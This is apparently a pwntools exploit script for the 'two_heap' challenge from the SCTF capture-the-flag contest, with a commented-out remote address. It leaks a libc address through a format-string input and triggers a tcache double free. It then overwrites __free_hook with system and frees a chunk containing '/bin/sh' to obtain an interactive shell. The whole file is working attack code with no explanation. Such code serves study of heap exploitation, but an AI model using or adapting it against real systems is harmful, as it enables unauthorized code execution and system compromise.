#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './two_heap'
sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so:./libc-2.26.so"})
# sh = process(execve_file)
# sh = remote('47.104.89.129',10002)
elf = ELF(execve_file)
libc = ELF('./libc-2.26.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $im=$rebase(0)
    def of
        p/x $arg0-$im
        end

    b *$rebase(0x1174)
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)


def New(size, content):
    sh.sendlineafter('Your choice:', '1')
    sh.sendlineafter('Input the size:\n', str(size))
    sh.sendafter('Input the note:', content)

def delete(index):
    sh.sendlineafter('Your choice:', '2')
    sh.sendlineafter('Input the index:\n', str(index))

# pause()
sh.sendafter('Welcome to SCTF:\n', '%f%f#%a\n')
sh.recvuntil('#')
result = sh.recvline()


data = int(result[5:-7], 16) * 0x10
libc_addr = data - libc.symbols['_IO_2_1_stdout_']
log.success("libc addr: " + hex(libc_addr))

New(0, '')
delete(0)
delete(0)
New(8, p64(libc_addr + libc.symbols['__free_hook']))
New(0x10, '/bin/sh\0\n')
New(0x18, p64(libc_addr + libc.symbols['system']) + '\n')

delete(2)

sh.interactive()

